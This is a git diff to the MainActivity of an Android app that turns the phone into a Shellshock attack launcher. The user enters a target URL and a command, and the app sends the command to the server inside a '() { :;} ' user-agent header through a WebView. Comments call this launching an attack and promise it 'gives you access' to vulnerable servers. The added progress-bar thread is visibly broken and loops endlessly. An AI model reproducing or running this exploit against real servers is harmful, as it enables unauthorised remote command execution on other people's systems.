@@ -34,7 +34,10 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.webkit.WebView;
 import android.webkit.WebSettings;
+import android.widget.ProgressBar;
 import android.widget.TextView;
+import android.widget.Toast;
+import android.util.Log;
 
 
 public class MainActivity extends ActionBarActivity {
@@ -42,10 +45,15 @@ public class MainActivity extends ActionBarActivity {
     Bundle state;
     EditText getTarget;
     EditText getTargetCommand;
-    TextView showConfirm;
+    TextView showConfirmTarget;
+    TextView showConfirmCommand;
     Button confirm;
     Button launch;
     WebView webBr;
+    String targetString;
+    String commandString;
+    WebSettings settingsBrowser;
+    ProgressBar showProgress;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -57,17 +65,65 @@ public class MainActivity extends ActionBarActivity {
         confirm = (Button)findViewById(R.id.checkAll);
         launch = (Button)findViewById(R.id.launch_btn_attack);
         webBr = (WebView)findViewById(R.id.browser);
+        showConfirmCommand = (TextView)findViewById(R.id.showcommand);
+        showConfirmTarget = (TextView)findViewById(R.id.showtarget);
+        showProgress = (ProgressBar)findViewById(R.id.showProgress);
         //Browser, to finish
-        WebSettings settingsBrowser = webBr.getSettings();
+        settingsBrowser = webBr.getSettings();
         webBr.setWebViewClient(new WebViewClient());
+        launch.setEnabled(false);
+        showProgress.setVisibility(View.VISIBLE);
+
     }
 
     public void onGetString(View v){
         /**Get from edittext and convert to String */
+        targetString = getTarget.getText().toString();
+        commandString = getTargetCommand.getText().toString();
+        showConfirmTarget.setText("Server target: "+targetString);
+        showConfirmCommand.setText("Command: "+commandString);
+        //Check if Strings are empty or not
+        if (!targetString.isEmpty() && !commandString.isEmpty()){
+            launch.setEnabled(true);
+            getTarget.setEnabled(false);
+            getTargetCommand.setEnabled(false);
+        } else{
+            launch.setEnabled(false);
+            getTarget.setEnabled(true);
+            getTargetCommand.setEnabled(true);
+            Toast t = Toast.makeText(this, "Check fields.", Toast.LENGTH_SHORT);
+            t.show();
+        }
     }
 
     public void onLaunchAttack(View v){
-        /**Launch attack*/
+        /**Launch attack
+         *
+         * Before, set somethings :)
+         * Be sure target is VULNERABLE
+         * This app no return anything.
+         * it says you when server comes called
+         * and it gives you access
+         */
+         Toast t = Toast.makeText(this, "Calling...", Toast.LENGTH_LONG);
+         t.show();
+         settingsBrowser.setUserAgentString("() { :;} "+commandString);
+         webBr.loadUrl(targetString);
+         final int progress = webBr.getProgress();
+         //ProgressBar doesn't work!
+         new Thread(new Runnable(){
+             public void run(){
+                 while(progress < 100){
+                     new Runnable(){
+                         public void run(){
+                             showProgress.setProgress(progress);
+
+                         }
+                     };
+                 }
+
+             }
+         }).start();
     }
 
 
